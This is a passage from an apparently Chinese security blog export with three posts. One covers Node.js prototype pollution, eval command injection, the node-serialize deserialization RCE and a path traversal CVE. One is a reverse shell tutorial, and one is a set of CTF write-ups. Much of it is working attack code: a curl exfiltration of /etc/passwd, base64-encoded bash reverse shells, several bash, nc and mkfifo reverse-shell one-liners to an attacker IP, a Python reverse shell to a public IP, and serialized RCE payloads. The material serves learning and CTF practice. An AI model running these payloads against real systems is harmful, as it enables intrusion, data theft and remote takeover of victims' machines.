<li>1中说到，foo.<strong>proto</strong>指向的是Foo类的prototype。那么，如果我们修改了foo.<strong>proto</strong>中的值，是不是就可以修改Foo类呢？</li>
</ol>
<p>做个简单的实验：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// foo是一个简单的JavaScript对象</span><br><span class="line">let foo = &#123;bar: 1&#125;</span><br><span class="line">// foo.bar 此时为1</span><br><span class="line">console.log(foo.bar)</span><br><span class="line">// 修改foo的原型（即Object）</span><br><span class="line">foo.__proto__.bar = 2</span><br><span class="line">// 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="line">console.log(foo.bar)</span><br><span class="line">// 此时再用Object创建一个空的zoo对象</span><br><span class="line">let zoo = &#123;&#125;</span><br><span class="line">// 查看zoo.bar</span><br><span class="line">console.log(zoo.bar)</span><br></pre></td></tr></table></figure>

<p>原因也显而易见：因为前面我们修改了foo的原型foo.<strong>proto</strong>.bar = 2，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。<br>后来，我们又用Object类创建了一个zoo对象let zoo = {}，zoo对象自然也有一个bar属性了。</p>
<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</p>
<p>这里还有个例子:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = &#123;&#125;</span><br><span class="line">&#123;&#125;</span><br><span class="line">b = &#123;&#125;</span><br><span class="line">&#123;&#125;</span><br><span class="line">a.__proto__.c = &apos;123&apos;</span><br><span class="line">&quot;123&quot;</span><br><span class="line">a.c</span><br><span class="line">&quot;123&quot;</span><br><span class="line">b.c</span><br><span class="line">&quot;123&quot;</span><br></pre></td></tr></table></figure>

<h2 id="2-4污染的应用情况"><a href="#2-4污染的应用情况" class="headerlink" title="2.4污染的应用情况"></a>2.4污染的应用情况</h2><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p>
<p>我们思考一下，哪些情况下我们可以设置<strong>proto</strong>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p>
<ul>
<li>对象merge</li>
<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">以对象merge为例，我们想象一个简单的merge函数：</span><br><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>在合并的过程中，存在赋值的操作target[key] = source[key]，那么，这个key如果是<strong>proto</strong>，是不是就可以原型链污染呢？<br>我们用如下代码实验一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure>

<p>结果是，合并虽然成功了，但原型链没有被污染<br>这是因为，我们用JavaScript创建o2的过程（let o2 = {a: 1, “<strong>proto</strong>“: {b: 2}}）中，<strong>proto</strong>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，<strong>proto</strong>并不是一个key，自然也不会修改Object的原型。</p>
<p>那么，如何让<strong>proto</strong>被认为是一个键名呢？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们将代码改成如下：</span><br><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = JSON.parse(&apos;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&apos;)</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure>

<p>可见，新建的o3对象，也存在b属性，说明Object已经被污染<br>这是因为，JSON解析的情况下，<strong>proto</strong>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
<p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p>
<h1 id="0x03-危险函数导致命令执行"><a href="#0x03-危险函数导致命令执行" class="headerlink" title="0x03 危险函数导致命令执行"></a>0x03 危险函数导致命令执行</h1><h2 id="3-1eval"><a href="#3-1eval" class="headerlink" title="3.1eval()"></a>3.1eval()</h2><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">简单例子main.js:</span><br><span class="line">var express = require(&quot;express&quot;);</span><br><span class="line">var app = express();</span><br><span class="line">app.get(&apos;/eval&apos;,function(req,res)&#123;</span><br><span class="line">    res.send(eval(req.query.q));</span><br><span class="line">    console.log(req.query.q);</span><br><span class="line">&#125;)</span><br><span class="line">var server = app.listen(8888, function() &#123;</span><br><span class="line">    console.log(&quot;应用实例，访问地址为 http://127.0.0.1:8888/&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>漏洞利用：</strong><br>Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(‘child_process’).exec(‘’);来进行调用。</p>
<p>弹计算器(windows)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/eval?q=require(&apos;child_process&apos;).exec(&apos;calc&apos;);</span><br></pre></td></tr></table></figure>

<p>读取文件(linux)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/eval?q=require(&apos;child_process&apos;).exec(&apos;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&apos;);;</span><br></pre></td></tr></table></figure>

<p>反弹shell(linux)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/eval?q=require(&apos;child_process&apos;).exec(&apos;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash&apos;);</span><br></pre></td></tr></table></figure>

<p>YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx是bash -i &gt;&amp; /dev/tcp/127.0.0.1/3333 0&gt;&amp;1 BASE64加密后的结果，直接调用会报错。<br>注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)</p>
<p>如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用global.process.mainModule.constructor._load(‘child_process’).exec(‘calc’)来执行命令.</p>
<h2 id="3-2类似命令"><a href="#3-2类似命令" class="headerlink" title="3.2类似命令"></a>3.2类似命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">间隔两秒执行函数：</span><br><span class="line">setInteval(some_function, 2000)</span><br><span class="line">两秒后执行函数：</span><br><span class="line">setTimeout(some_function, 2000);</span><br></pre></td></tr></table></figure>

<p>some_function处就类似于eval函数的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输出HelloWorld：</span><br><span class="line">Function(&quot;console.log(&apos;HelloWolrd&apos;)&quot;)()</span><br></pre></td></tr></table></figure>

<p>类似于php中的create_function<br>以上都可以导致命令执行</p>
<h1 id="0x04-node-serialize反序列化RCE漏洞-CVE-2017-5941"><a href="#0x04-node-serialize反序列化RCE漏洞-CVE-2017-5941" class="headerlink" title="0x04 node-serialize反序列化RCE漏洞(CVE-2017-5941)"></a>0x04 node-serialize反序列化RCE漏洞(CVE-2017-5941)</h1><p>漏洞出现在node-serialize模块0.0.4版本当中.</p>
<h2 id="4-1了解什么是IIFE："><a href="#4-1了解什么是IIFE：" class="headerlink" title="4.1了解什么是IIFE："></a>4.1了解什么是IIFE：</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F" target="_blank" rel="noopener">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的 JavaScript 函数。</p>
<p>IIFE一般写成下面的形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(function()&#123; /* code */ &#125;());</span><br><span class="line">// 或者</span><br><span class="line">(function()&#123; /* code */ &#125;)();</span><br></pre></td></tr></table></figure>

<h2 id="4-2node-serialize-0-0-4漏洞点"><a href="#4-2node-serialize-0-0-4漏洞点" class="headerlink" title="4.2node-serialize@0.0.4漏洞点"></a><a href="mailto:4.2node-serialize@0.0.4" target="_blank" rel="noopener">4.2node-serialize@0.0.4</a>漏洞点</h2><p>漏洞代码位于node_modules\node-serialize\lib\serialize.js大概75行中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">obj[key] = eval(&apos;(&apos; + obj[key].substring(FUNCFLAG.length) + &apos;)&apos;);</span><br></pre></td></tr></table></figure>

<p>可以看到传递给eval的参数是用括号包裹的，所以如果构造一个function(){}()函数，在反序列化时就会被当中IIFE立即调用执行。</p>
<h2 id="4-3构造Payload"><a href="#4-3构造Payload" class="headerlink" title="4.3构造Payload"></a>4.3构造Payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">serialize = require(&apos;node-serialize&apos;);</span><br><span class="line">var test = &#123;</span><br><span class="line"> rce : function()&#123;require(&apos;child_process&apos;).exec(&apos;ls /&apos;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;,</span><br><span class="line">&#125;</span><br><span class="line">console.log(&quot;序列化生成的 Payload: \n&quot; + serialize.serialize(test));</span><br></pre></td></tr></table></figure>

<p>生成的Payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&apos;child_process&apos;).exec(&apos;ls /&apos;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个()，结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&apos;child_process&apos;).exec(&apos;ls /&apos;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>(这里不能直接在对象内定义IIFE表达式，不然会序列化失败)<br>传递给unserialize(注意转义单引号)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var serialize = require(&apos;node-serialize&apos;);</span><br><span class="line">var payload = &apos;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(\&apos;child_process\&apos;).exec(\&apos;ls /\&apos;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;&apos;;</span><br><span class="line">serialize.unserialize(payload);</span><br></pre></td></tr></table></figure>

<p>执行命令成功</p>
<h1 id="0x05-Node-js-目录穿越漏洞复现-CVE-2017-14849"><a href="#0x05-Node-js-目录穿越漏洞复现-CVE-2017-14849" class="headerlink" title="0x05 Node.js 目录穿越漏洞复现(CVE-2017-14849)"></a>0x05 Node.js 目录穿越漏洞复现(CVE-2017-14849)</h1><p>在vulhub上面可以直接下载到环境。</p>
<p>漏洞影响的版本：</p>
<ul>
<li>Node.js 8.5.0 + Express 3.19.0-3.21.2</li>
<li>Node.js 8.5.0 + Express 4.11.0-4.15.5<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">运行漏洞环境：</span><br><span class="line">cd vulhub/node/CVE-2017-14849/</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>用Burpsuite获取(GET)地址：/static/../../../a/../../../../etc/passwd 即可下载到/etc/passwd文件.<br>具体分析可见：<a href="https://security.tencent.com/index.php/blog/msg/121" target="_blank" rel="noopener">Node.js CVE-2017-14849 漏洞分析</a></p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell</title>
    <url>/2020/03/06/%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><a id="more"></a>
<h2 id="0x00-什么是反弹shell"><a href="#0x00-什么是反弹shell" class="headerlink" title="0x00 什么是反弹shell"></a><strong>0x00 什么是反弹shell</strong></h2><p>reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
<h2 id="0x01-为什么要反弹shell"><a href="#0x01-为什么要反弹shell" class="headerlink" title="0x01 为什么要反弹shell"></a><strong>0x01 为什么要反弹shell</strong></h2><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p>
<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p>
<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
<p>2.它的ip会动态改变，你不能持续控制。</p>
<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
<p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
<h2 id="0x02-反弹shell的本质是什么"><a href="#0x02-反弹shell的本质是什么" class="headerlink" title="0x02 反弹shell的本质是什么"></a><strong>0x02 反弹shell的本质是什么</strong></h2><p>我们可以先以一个linux 下的反弹shell 的命令为例来看一下反弹shell 的命令都做了些什么，掌握了反弹的本质，再多的方法其实只是换了包装而已。</p>
<p><strong>实验环境：</strong></p>
<p><strong>受害者：</strong>Ubuntu Linux ——&gt; 192.168.146.128</p>
<p><strong>攻击者：</strong>Kali Linux ——&gt; 192.168.146.129</p>
<p>我们就以最常见的bash为例：</p>
<p>attacker机器上执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>

<p>victim 机器上执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>你就可以看到在攻击机上出现了受害者机器的shell.<br>解释一下这条命令具体的含义：</p>
<h3 id="1-bash-i"><a href="#1-bash-i" class="headerlink" title="1.bash -i"></a><strong>1.bash -i</strong></h3><p>1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p>
<p>2）-i 这个参数表示的是产生交互式的shell</p>
<h3 id="2-dev-tcp-ip-port"><a href="#2-dev-tcp-ip-port" class="headerlink" title="2./dev/tcp/ip/port"></a><strong>2./dev/tcp/ip/port</strong></h3><p>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的，但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信</p>
<p><strong>实例1：</strong></p>
<p>我们输出字符串到这个文件里:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo hacked by Horizon &gt; /dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure>

<p>攻击机上就会输出:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hacked by Horizon</span><br></pre></td></tr></table></figure>

<h3 id="3-交互重定向"><a href="#3-交互重定向" class="headerlink" title="3.交互重定向"></a><strong>3.交互重定向</strong></h3><p>为了实现交互，我们需要把受害者交互式shell的输出重定向到攻击机上</p>
<p>在受害者机器上输入:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure>

<p>任何在受害者机器上执行的指令都不会直接回显了，而是在攻击者机器上回显。<br>但是这里有一个问题，攻击者没有能够实现对受害者的控制，攻击者执行的命令没法在受害者电脑上执行。</p>
<p>于是我们似乎还需要一条这样的指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &lt; /dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure>

<p>这条指令的意思是将攻击者输入的命令输入给受害者的bash，自然就能执行了<br>现在我们需要将两条指令结合起来：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><strong>输入0是由/dev/tcp/192.168.146.129/2333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到/dev/tcp/192.168.156.129/2333上，这就形成了一个回路，实现了我们远程交互式shell 的功能</strong><br><strong>注意：</strong></p>
<p>但是这里有一个问题，就是我们在受害者机器上依然能看到我们在攻击者机器中执行的指令 </p>
<h3 id="4-gt-amp-、-amp-gt"><a href="#4-gt-amp-、-amp-gt" class="headerlink" title="4. &gt;&amp;、&amp;&gt;"></a><strong>4. &gt;&amp;、&amp;&gt;</strong></h3><p>这个符号在我附上链接的那篇文章中也提到了，作用就是混合输出（错误、正确输出都输出到一个地方）</p>
<p>现在我们解决一下前面的问题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>当然我们也可以执行与之完全等价的指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><strong>至此，我们的反弹shell的经典语句就分析完了，通过这条语句的分析我们能大致的了解反弹shell的本质，以后碰到其他的反弹shell 的语句也能用类似的分析方法区分析，甚至我们也可以自己举一反三创造更加绝妙的反弹shell 的语句</strong></p>
<h2 id="0x03-常见的反弹shell-的语句怎么理解"><a href="#0x03-常见的反弹shell-的语句怎么理解" class="headerlink" title="0x03 常见的反弹shell 的语句怎么理解"></a><strong>0x03 常见的反弹shell 的语句怎么理解</strong></h2><h3 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1.方法一"></a><strong>1.方法一</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>和</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;1</span><br></pre></td></tr></table></figure>

<p>这里的唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别</p>
<h3 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2.方法二"></a><strong>2.方法二</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 &lt;&amp;2</span><br></pre></td></tr></table></figure>

<p>等价于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;2</span><br></pre></td></tr></table></figure>

<h3 id="3-方法三"><a href="#3-方法三" class="headerlink" title="3.方法三"></a><strong>3.方法三</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure>

<p><strong>简单的解释一下：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure>

<p>这一句将文件描述符5重定向到了 /dev/tcp/192.168.146.129/2333 并且方式是<strong>读写方式</strong>（这种方法在我的前面的文章中也讲到过），于是我们就能通过文件描述符对这个socket连接进行操作了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">command|while read line do .....done</span><br></pre></td></tr></table></figure>

<p>这个是一个非常经典的句子，它的原句是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while read line</span><br><span class="line">do</span><br><span class="line">       …</span><br><span class="line">done &lt; file</span><br></pre></td></tr></table></figure>

<p>从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。<br>而现在我们不是从file 文件中输入了，我们使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p>
<h3 id="4-方法四"><a href="#4-方法四" class="headerlink" title="4.方法四"></a><strong>4.方法四</strong></h3><p>nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.146.129 2333</span><br></pre></td></tr></table></figure>

<p>但是如果是没有-e 选项是不是就不能实现了呢？当然不是，我们可以向下面这样<br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;/tmp/f</p>
<p><strong>简单的解释：</strong></p>
<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
<p>类似的命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>V&amp;N内部赛部分wp</title>
    <url>/2020/03/06/v&amp;n%E5%86%85%E9%83%A8%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="misc拉胯的三条命令"><a href="#misc拉胯的三条命令" class="headerlink" title="misc拉胯的三条命令"></a>misc拉胯的三条命令</h1><a id="more"></a>
<p>打开后有个说明txt,说扫描端口查看开的端口,那直接看tcp握手有没有成功就可以了.</p>
<p> 直接看ack和syn包有没有同时存在,最后有21,22, 631,801,3306开放,按顺序提交就可以了.</p>
<p>(kali的wireshark有着色规则,一片红里面找白就可以了)</p>
<h1 id="misc内存取证"><a href="#misc内存取证" class="headerlink" title="misc内存取证"></a>misc内存取证</h1><p>打开后直接上volatility,先看进程有ie,有mspaint,有truecrypt.</p>
<p>先看iehistory,可以找到有个网盘地址:<a href="https://pan.baidu.com/share/init?surl=jAVwrRzIgW1QsLHidtzY_w" target="_blank" rel="noopener">https://pan.baidu.com/share/init?surl=jAVwrRzIgW1QsLHidtzY_w</a>.</p>
<p>mspaint复原之后是一串字符串:lYxfCQ6goYBD6Q (这个字符串 到底是 1，l，I也不知道… 69o? 6g0? 6go?)</p>
<p>把notepad进程dump下来过滤字符串txt可以看到有网盘提取码:heem.</p>
<p>把百度网盘下载的VOL利用TrueCrypt进程的内存dump用Elcomsoft Forensic Disk Decryptor工具(吾爱有破解版)解密VOL再挂载得到key.key:uOjFdKu1jsbWI8N51jsbWI8N5.</p>
<p>尝试了异或,维吉尼亚等有密钥的加解密.</p>
<p>后来才知道要用key再解一次密,得到一个压缩包,然后掩码攻击得到flag.</p>
<h1 id="webCheckIN"><a href="#webCheckIN" class="headerlink" title="webCheckIN"></a>webCheckIN</h1><p>打开靶机，发现是如下一个页面，直接给了源码。右键查看源码可以看到有换行的，方便查看。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">import os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)</span><br><span class="line"># flag = flag_file.read()</span><br><span class="line"># flag_file.close()</span><br><span class="line">#</span><br><span class="line"># @app.route(&apos;/flag&apos;)</span><br><span class="line"># def flag():</span><br><span class="line">#     return flag</span><br><span class="line">## want flag? naive!</span><br><span class="line"># You will never find the thing you want:) I think</span><br><span class="line">@app.route(&apos;/shell&apos;)</span><br><span class="line">def shell():</span><br><span class="line">    os.system(&quot;rm -f flag.txt&quot;)</span><br><span class="line">    exec_cmd = request.args.get(&apos;c&apos;)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    return &quot;1&quot;</span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def source():</span><br><span class="line">    return open(&quot;app.py&quot;,&quot;r&quot;).read()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;)</span><br></pre></td></tr></table></figure>

<p>然后看看源码，可以看到是个 flask 应用。<br>前面打开了一个 flag 文件，后面被注释的部分是读这个文件的内容，下面有个被注释的路由是把 flag 显示出来。</p>
<p>然后下面有个不带回显的 shell，在每次执行命令前都会把 flag 文件删除。</p>
<p>那么就首先反弹个 shell 到自己的机器上吧。这里因为是 python 应用就直接用 python 反弹了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell?c=python3 -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.0.226.228&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>

<p>反弹之后可以看见 flag 文件是被删除了，但由于之前程序打开了 flag 文件，在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（上文是利用 rm -f flag.txt）删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，通过这个我们即可得到被删除文件的内容。<br>在 /proc/10/fd/3 下找到了 flag。</p>
<h1 id="webTimeTravel"><a href="#webTimeTravel" class="headerlink" title="webTimeTravel"></a>webTimeTravel</h1><p>HTTPoxy漏洞（CVE-2016-5385）</p>
<p><a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">取自vulhub的一个cve</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require __DIR__ . &apos;/vendor/autoload.php&apos;;</span><br><span class="line">use GuzzleHttp\Client;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&apos;flag&apos;])) &#123;</span><br><span class="line">    $client = new Client();</span><br><span class="line">    $response = $client-&gt;get(&apos;http://127.0.0.1:5000/api/eligible&apos;);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, TRUE);</span><br><span class="line">    if($data[&apos;success&apos;] === true) &#123;</span><br><span class="line">      echo system(&apos;/readflag&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;file&apos;])) &#123;</span><br><span class="line">    highlight_file($_GET[&apos;file&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;phpinfo&apos;])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个漏洞的前提之一就是:你的服务跑在PHP的CGI模式下(cgi, php-fpm),看一下phpinfo找到fpm<br>然后就看一下如何利用吧:</p>
<ul>
<li>cgi（fastcgi）要将用户传入的所有HTTP头都加上HTTP_前缀放入环境变量中，而恰好大多数类库约&gt;定俗成会提取环境变量中的HTTP_PROXY值作为HTTP代理地址。于是，恶意用户通过提交Proxy: &gt;<a href="http://evil.com这样的HTTP头，将使用缺陷类库的网站的代理设置为[http://evil.com](http://evil.com)，进而窃取数据包&gt;中可能存在的敏感信息。" target="_blank" rel="noopener">http://evil.com这样的HTTP头，将使用缺陷类库的网站的代理设置为[http://evil.com](http://evil.com)，进而窃取数据包&gt;中可能存在的敏感信息。</a></li>
<li>PHP5.6.24版本修复了该漏洞，不会再将Proxy放入环境变量中.</li>
</ul>
<p>也就是增加一个Proxy的头，cgi会自动将我们加上HTTP_前缀，正好构成了环境变量中的HTTP_PROXY代理，结合题目就是将请求结果构造成{“success”=&gt;true}会返回flag.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">还是要用到内网服务器，不过这里达服务我一直没弄成功，其实只要构造一个response返回就可以了，参考一位师傅的payload：</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.14.2</span><br><span class="line">Date: Sat, 29 Feb 2020 05:27:31 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>

